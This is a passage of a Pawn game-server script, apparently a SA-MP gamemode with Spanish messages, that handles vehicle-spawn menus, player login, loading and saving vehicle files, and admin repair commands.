				case 13 : ShowPlayerDialog( playerid, DIALOGID3+38, DIALOG_STYLE_LIST, "Únicos", "Baggage\nBrownstreak (Train)\nCaddy\nCamper\nCamper A\nCombine Harvester\nDozer\nDumper\nForklift\nFreight (Train)\nHotknife\nHustler\nHotdog\nKart\nMower\nMr Whoopee\nRomero\nSecuricar\nStretch\nSweeper\nTram\nTowtruck\nTug\nVortex", "Seleccionar", "Cancelar" );
				case 14 : ShowPlayerDialog( playerid, DIALOGID3+39, DIALOG_STYLE_LIST, "Vehiculos RC", "RC Bandit\nRC Baron\nRC Raider\nRC Goblin\nRC Tiger\nRC Cam", "Seleccionar", "Cancelar" );
			}
		}
		return 1;
	}
	if(dialogid == DIALOGID3+25)
	{
	    if ( response )
	    {
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 592, 577, 511, 512, 593, 553, 476, 519, 460, 513 };
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+26)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 548, 417, 487, 488, 497, 563, 469 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+27)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 581, 509, 481, 462, 521, 463, 510, 522, 461, 448, 471, 468, 586 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+28)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 480, 533, 439, 555 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+29)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 499, 422, 482, 498, 609, 524, 578, 455, 403, 414, 582, 443, 514, 413, 515, 440, 543, 605, 459, 531, 408, 552, 478, 456, 554 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+30)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 536, 575, 534, 567, 535, 566, 576, 412 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+31)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 568, 424, 573, 579, 400, 500, 444, 556, 557, 470, 489, 505, 495 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+32)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 416, 433, 431, 438, 437, 523, 427, 490, 528, 407, 544, 596, 598, 597, 599, 601, 420 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+33)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 445, 504, 401, 518, 527, 542, 507, 562, 585, 419, 526, 604, 466, 492, 474, 546, 517, 410, 551, 516, 467, 600, 426, 436, 547, 405, 580, 560, 550, 549, 540, 491, 529, 421 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+34)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 602, 429, 496, 402, 541, 415, 589, 587, 565, 494, 502, 503, 411, 559, 603, 475, 506, 451, 558, 477 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+35)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 418, 404, 479, 458, 561 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+36)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 472, 473, 493, 595, 484, 430, 453, 452, 446, 454 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+37)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 435, 450, 591, 606, 607, 610, 569, 590, 584, 570, 608, 611 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+38)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 485, 537, 457, 483, 508, 532, 486, 406, 530, 538, 434, 545, 588, 571, 572, 423, 442, 428, 409, 574, 449, 525, 583, 539 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == DIALOGID3+39)
	{
	    if ( response )
	    {
	        new
	            Float:x,
	            Float:y,
	            Float:z,
	            Float:angle,
	            model_array[] = { 441, 464, 465, 501, 564, 594 };
			if(playervehicle[playerid] != 0) DestroyVehicle(playervehicle[playerid]);
			GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			playervehicle[playerid]=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(playervehicle[playerid],GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,playervehicle[playerid],0);
			VehicleInfo[playervehicle[playerid]][Temp] = 1;
			return 1;
	    }
	}
	if(dialogid == INGRESO2)
	{
	    if(!response) return Kick(playerid);
		if(response)
		{
		    if (udb_CheckLogin(PlayerName2(playerid),inputtext))
			{
                new file[256], tmp3[100], lname[MAX_PLAYER_NAME];
			   	GetPlayerName(playerid,lname,sizeof(lname));
	   		   	format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(lname));
   			   	GetPlayerIp(playerid,tmp3,100);
	   		   	dini_Set(file,"ip",tmp3);
			   	LoginPlayer(playerid);
			   	LoadPlayer(playerid);
	   		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
				if(PlayerInfo[playerid][Level] > 0)
				{
					format(string,sizeof(string),"|Cuenta| »{EAEAEA} Te has identificado correctamente. {0080FF}[Nivel %d] {00FF00}[Nivel Vip: %d]", PlayerInfo[playerid][Level],PlayerInfo[playerid][Vip] );
					SendClientMessage(playerid,red,string);
					return 1;
		       	} else return SendClientMessage(playerid,red,"|Cuenta| »{EAEAEA} Te has identificado correctamente.");
			}
			else
			{
			    PlayerInfo[playerid][FailLogin]++;
			    format(string, sizeof(string), "{FFFFFF}Contraseña incorrecta.\n\n{FFFFFF}Max. Intentos: {20B3FF}%d.\n{FFFFFF}Intento Numero:{20B3FF} %d.", MAX_FAIL_LOGINS,PlayerInfo[playerid][FailLogin]);
				ShowPlayerDialog(playerid, INGRESO2, DIALOG_STYLE_INPUT,"{FFFFFF}Ingreso",string,"Acceder","");
				if(PlayerInfo[playerid][FailLogin] == MAX_FAIL_LOGINS)
				{
				    //SendClientMessage(playerid,red,"{FFFFFF}Haz puesto varias {FF0000}contraseñas {FFFFFF}incorrectas has sido Kickeado del servidor por seguridad.");
					format(string, sizeof(string), "{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Contraseña Incorrecta)", PlayerName2(playerid), playerid );
					SendClientMessageToAll(red, string);
					Kick(playerid);
				}
				return 1;
			}
		}
	}
	return 0;
}
forward BankRobbedRecentlyTimer();
public BankRobbedRecentlyTimer()
{
	for(new i = 0; i < MAX_PLAYERS; i ++) {
	    if(IsPlayerConnected(i)) {
	        if(PlayerInfo[i][Level] >= 0) {
	        	//SendClientMessage(i, red, "|Bank| »{FFFFFF} Ya pueden volver a robar el banco.");
			}
		}
	}
	BankRobbedRecently = 0;
}


//=======================Vehicle Loading Systems================================
stock SetupVehiclesFile()
{
    new File: file;
    file = fopen(V_FILE_SAVE, io_write);
    new SplitDiv[99][MAX_VEHICLES];
	new filestring[256];
	file = fopen(V_FILE_LOAD, io_read);
	new carcost[MAX_VEHICLES];
	for(new vehicleid=1;vehicleid<=vehcount;vehicleid++)
	{
		if (file)
		{
			fread(file, filestring);
		 	split(filestring, SplitDiv, ',');
			VehicleInfo[vehicleid][model] = strval(SplitDiv[0]);
			VehicleInfo[vehicleid][x_spawn] = floatstr(SplitDiv[1]);
			VehicleInfo[vehicleid][y_spawn] = floatstr(SplitDiv[2]);
			VehicleInfo[vehicleid][z_spawn] = floatstr(SplitDiv[3]);
			VehicleInfo[vehicleid][za_spawn] = floatstr(SplitDiv[4]);
			VehicleInfo[vehicleid][ox_spawn] = floatstr(SplitDiv[1]);
			VehicleInfo[vehicleid][oy_spawn] = floatstr(SplitDiv[2]);
			VehicleInfo[vehicleid][oz_spawn] = floatstr(SplitDiv[3]);
			VehicleInfo[vehicleid][oza_spawn] = floatstr(SplitDiv[4]);
			VehicleInfo[vehicleid][color_1] = strval(SplitDiv[5]);
			VehicleInfo[vehicleid][color_2] = strval(SplitDiv[6]);
			CreateVehicle(VehicleInfo[vehicleid][model], VehicleInfo[vehicleid][x_spawn], VehicleInfo[vehicleid][y_spawn], VehicleInfo[vehicleid][z_spawn], VehicleInfo[vehicleid][za_spawn], VehicleInfo[vehicleid][color_1], VehicleInfo[vehicleid][color_2],20000);
			onsys[vehicleid] = 1;
			carcost[vehicleid] = 50000;
    		for(new s=0; s<24; s++) {
     			if(VehicleInfo[vehicleid][model] == heavycar[s][0]) {
       				carcost[vehicleid] = 100000;
   	        	}
			}
			for(new a=0; a<11; a++) {
     			if(VehicleInfo[vehicleid][model] == boat[a][0]) {
       				carcost[vehicleid] = 75000;
   	   		     }
			}
			for(new mb=0; mb<11; mb++) {
	     		if(VehicleInfo[vehicleid][model] == mbike[mb][0]) {
   	    			carcost[vehicleid] = 40000;
	   	        }
			}
			for(new d=0; d<3; d++) {
   		  		if(VehicleInfo[vehicleid][model] == pbike[d][0]) {
       				carcost[vehicleid] = 5000;
   	   		     }
			}
			for(new e=0; e<6; e++) {
    	 		if(VehicleInfo[vehicleid][model] == splane[e][0]) {
       				carcost[vehicleid] = 500000;
   	        	}
			}
			for(new f=0; f<2; f++) {
     			if(VehicleInfo[vehicleid][model] == mplane[f][0]) {
       					carcost[vehicleid] = 1500000;
   	    	    }
			}
			for(new v=0; v<2; v++) {
     			if(VehicleInfo[vehicleid][model] == lplane[v][0]) {
       				carcost[vehicleid] = 2000000;
   	    	    }
			}
			for(new n=0; n<4; n++) {
     			if(VehicleInfo[vehicleid][model] == milair[n][0]) {
       				carcost[vehicleid] = 4000000;
   	        	}
			}
			for(new j=0; j<4; j++) {
     			if(VehicleInfo[vehicleid][model] == sheli[j][0]) {
       				carcost[vehicleid] = 750000;
   	        	}
			}
			for(new k=0; k<3; k++) {
     			if(VehicleInfo[vehicleid][model] == lheli[k][0]) {
       				carcost[vehicleid] = 1250000;
   	        	}
			}
			VehicleInfo[vehicleid][vehiclecost] = carcost[vehicleid];
			VehicleInfo[vehicleid][vused] = 0;
			VehicleInfo[vehicleid][bought] = 0;
			VehicleInfo[vehicleid][secure] = 0;
			VehicleInfo[vehicleid][asecure] = 0;
			VehicleInfo[vehicleid][buybar] = 0;
			VehicleInfo[vehicleid][mod1] = 0;
			VehicleInfo[vehicleid][mod2] = 0;
			VehicleInfo[vehicleid][mod3] = 0;
			VehicleInfo[vehicleid][mod4] = 0;
			VehicleInfo[vehicleid][mod5] = 0;
			VehicleInfo[vehicleid][mod6] = 0;
			VehicleInfo[vehicleid][mod7] = 0;
			VehicleInfo[vehicleid][mod8] = 0;
			VehicleInfo[vehicleid][mod9] = 0;
			VehicleInfo[vehicleid][mod10] = 0;
			VehicleInfo[vehicleid][mod11] = 0;
			VehicleInfo[vehicleid][mod12] = 0;
			VehicleInfo[vehicleid][mod13] = 0;
			VehicleInfo[vehicleid][mod14] = 0;
			VehicleInfo[vehicleid][mod15] = 0;
			VehicleInfo[vehicleid][mod16] = 0;
			VehicleInfo[vehicleid][mod17] = 0;
			VehicleInfo[vehicleid][paintjob] = -1;
			strmid(VehicleInfo[vehicleid][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
            strmid(VehicleInfo[vehicleid][name], VehicleName[GetVehicleModel(vehicleid)-400][0], 0, strlen(VehicleName[GetVehicleModel(vehicleid)-400][0]), 255);
			new addmess[256];
			format(addmess,sizeof(addmess),"--:: Vehicle %d (%s) successfully spawned ::--",vehicleid,VehicleInfo[vehicleid][name]);
			//print(addmess);
		}
	}
	fclose(file);
//	print(">------------------------------------------------");
//	print(" ");
//	print(">------------------------------------------------");
//	print("Initialising Vehicle File System - Please Wait For Confirmation...");
//	print(" ");
	SaveVehicles();
//	print(" ");
//	print("Vehicle File System 100% Initialised...");
//	print(">------------------------------------------------");
//	printf(" ");
}

stock LoadVehicles()
{
	if(fexist(V_FILE_SAVE)) {
        new SplitDiv[99][MAX_VEHICLES];
		new filestring[256];
		new File: file = fopen(V_FILE_SAVE, io_read);
		if (file) {
	    	for(new vehicleid = 1;vehicleid<=vehcount;vehicleid++)
			{
		    	fread(file, filestring);
				split(filestring, SplitDiv, ',');
				VehicleInfo[vehicleid][model] = strval(SplitDiv[0]);
				VehicleInfo[vehicleid][x_spawn] = floatstr(SplitDiv[1]);
				VehicleInfo[vehicleid][y_spawn] = floatstr(SplitDiv[2]);
				VehicleInfo[vehicleid][z_spawn] = floatstr(SplitDiv[3]);
				VehicleInfo[vehicleid][za_spawn] = floatstr(SplitDiv[4]);
				VehicleInfo[vehicleid][ox_spawn] = floatstr(SplitDiv[5]);
				VehicleInfo[vehicleid][oy_spawn] = floatstr(SplitDiv[6]);
				VehicleInfo[vehicleid][oz_spawn] = floatstr(SplitDiv[7]);
				VehicleInfo[vehicleid][oza_spawn] = floatstr(SplitDiv[8]);
				VehicleInfo[vehicleid][color_1] = strval(SplitDiv[9]);
				VehicleInfo[vehicleid][color_2] = strval(SplitDiv[10]);
				VehicleInfo[vehicleid][vehiclecost] = strval(SplitDiv[11]);
				VehicleInfo[vehicleid][bought] = strval(SplitDiv[12]);
				VehicleInfo[vehicleid][secure] = strval(SplitDiv[13]);
				VehicleInfo[vehicleid][asecure] = strval(SplitDiv[14]);
				VehicleInfo[vehicleid][vused] = 0;
				VehicleInfo[vehicleid][buybar] = strval(SplitDiv[16]);
				VehicleInfo[vehicleid][mod1] = strval(SplitDiv[17]);
				VehicleInfo[vehicleid][mod2] = strval(SplitDiv[18]);
				VehicleInfo[vehicleid][mod3] = strval(SplitDiv[19]);
				VehicleInfo[vehicleid][mod4] = strval(SplitDiv[20]);
				VehicleInfo[vehicleid][mod5] = strval(SplitDiv[21]);
				VehicleInfo[vehicleid][mod6] = strval(SplitDiv[22]);
				VehicleInfo[vehicleid][mod7] = strval(SplitDiv[23]);
				VehicleInfo[vehicleid][mod8] = strval(SplitDiv[24]);
				VehicleInfo[vehicleid][mod9] = strval(SplitDiv[25]);
				VehicleInfo[vehicleid][mod10] = strval(SplitDiv[26]);
				VehicleInfo[vehicleid][mod11] = strval(SplitDiv[27]);
				VehicleInfo[vehicleid][mod12] = strval(SplitDiv[28]);
				VehicleInfo[vehicleid][mod13] = strval(SplitDiv[29]);
				VehicleInfo[vehicleid][mod14] = strval(SplitDiv[30]);
				VehicleInfo[vehicleid][mod15] = strval(SplitDiv[31]);
				VehicleInfo[vehicleid][mod16] = strval(SplitDiv[32]);
				VehicleInfo[vehicleid][mod17] = strval(SplitDiv[33]);
				VehicleInfo[vehicleid][paintjob] = strval(SplitDiv[36]);
				strmid(VehicleInfo[vehicleid][owner], SplitDiv[34], 0, strlen(SplitDiv[34]), 255);
				strmid(VehicleInfo[vehicleid][name], SplitDiv[35], 0, strlen(SplitDiv[35]), 255);
			 	CreateVehicle(VehicleInfo[vehicleid][model], VehicleInfo[vehicleid][x_spawn], VehicleInfo[vehicleid][y_spawn], VehicleInfo[vehicleid][z_spawn], VehicleInfo[vehicleid][za_spawn], VehicleInfo[vehicleid][color_1], VehicleInfo[vehicleid][color_2],20000);
                onsys[vehicleid] = 1;
				new addmess[256];
				format(addmess,sizeof(addmess),"--:: Vehicle %d (%s) successfully Loaded and placed - owner: %s ::--",vehicleid,VehicleInfo[vehicleid][name],VehicleInfo[vehicleid][owner]);
				//print(addmess);
			}
		}
		fclose(file);
	}
	else {
		SetupVehiclesFile();
	}
}

stock SaveVehicles()
{
	new filestring[512];
	new File: vfile = fopen(V_FILE_SAVE, io_write);
    for(new vehicleid = 1;vehicleid<=vehcount;vehicleid++)
 	{
		format(filestring, sizeof(filestring), "%d,%f,%f,%f,%f,%f,%f,%f,%f,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%s,%s,%d\n",
		VehicleInfo[vehicleid][model],
		VehicleInfo[vehicleid][x_spawn],
		VehicleInfo[vehicleid][y_spawn],
		VehicleInfo[vehicleid][z_spawn],
		VehicleInfo[vehicleid][za_spawn],
		VehicleInfo[vehicleid][ox_spawn],
		VehicleInfo[vehicleid][oy_spawn],
		VehicleInfo[vehicleid][oz_spawn],
		VehicleInfo[vehicleid][oza_spawn],
		VehicleInfo[vehicleid][color_1],
		VehicleInfo[vehicleid][color_2],
		VehicleInfo[vehicleid][vehiclecost],
		VehicleInfo[vehicleid][bought],
		VehicleInfo[vehicleid][secure],
		VehicleInfo[vehicleid][asecure],
		VehicleInfo[vehicleid][vused],
		VehicleInfo[vehicleid][buybar],
		VehicleInfo[vehicleid][mod1],
		VehicleInfo[vehicleid][mod2],
		VehicleInfo[vehicleid][mod3],
		VehicleInfo[vehicleid][mod4],
		VehicleInfo[vehicleid][mod5],
		VehicleInfo[vehicleid][mod6],
		VehicleInfo[vehicleid][mod7],
		VehicleInfo[vehicleid][mod8],
		VehicleInfo[vehicleid][mod9],
		VehicleInfo[vehicleid][mod10],
		VehicleInfo[vehicleid][mod11],
		VehicleInfo[vehicleid][mod12],
		VehicleInfo[vehicleid][mod13],
		VehicleInfo[vehicleid][mod14],
		VehicleInfo[vehicleid][mod15],
		VehicleInfo[vehicleid][mod16],
		VehicleInfo[vehicleid][mod17],
		VehicleInfo[vehicleid][owner],
		VehicleInfo[vehicleid][name],
		VehicleInfo[vehicleid][paintjob]
		);
		fwrite(vfile, filestring);
	}
	fclose(vfile);
}

stock ModVehicle(vehicleid)
{
	new tuned2 = 0;
	if(VehicleInfo[vehicleid][mod1] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod1]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod2] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod2]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod3] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod3]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod4] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod4]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod5] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod5]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod6] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod6]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod7] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod7]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod8] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod8]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod9] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod9]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod10] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod10]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod11] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod11]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod12] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod12]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod13] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod13]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod14] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod14]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod15] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod15]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod16] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod16]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][mod17] != 0) {
		AddVehicleComponent(vehicleid,VehicleInfo[vehicleid][mod17]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][color_1] > -1 || VehicleInfo[vehicleid][color_2] > -1) {
		ChangeVehicleColor(vehicleid,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2]);
		tuned2 = 1;
	}
	if(VehicleInfo[vehicleid][paintjob] > -1) {
		ChangeVehiclePaintjob(vehicleid,VehicleInfo[vehicleid][paintjob]);
		tuned2 = 1;
	}
	if(tuned2 == 1) {
		tuned++;
	}
}
//--------------------------------A Fix Player Slots----------------------------
CMD:afixcar(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		new giveplayerid;
		if (sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /AfixCar [JugadorID]");
		afixcars(giveplayerid);
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Car slots successfully Repaired!");
		return 1;
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}
CMD:afixh(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		new giveplayerid;
		if (sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /AFixH [JugadorID]");
		afixhs(giveplayerid);
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} House successfully Repaired!");
		return 1;
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}
CMD:afixbiz(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		new giveplayerid;
		if (sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /AfixBiz [JugadorID]");
		afixbizs(giveplayerid);
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Negocio reparado con éxito");
		return 1;
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}
CMD:afixall(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		new giveplayerid;
		if (sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /AfixAll [JugadorID]");
		afixcars(playerid);
		afixhs(playerid);
		afixbizs(playerid);
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Autos, casa y negocio reparados con éxito.");
		return 1;
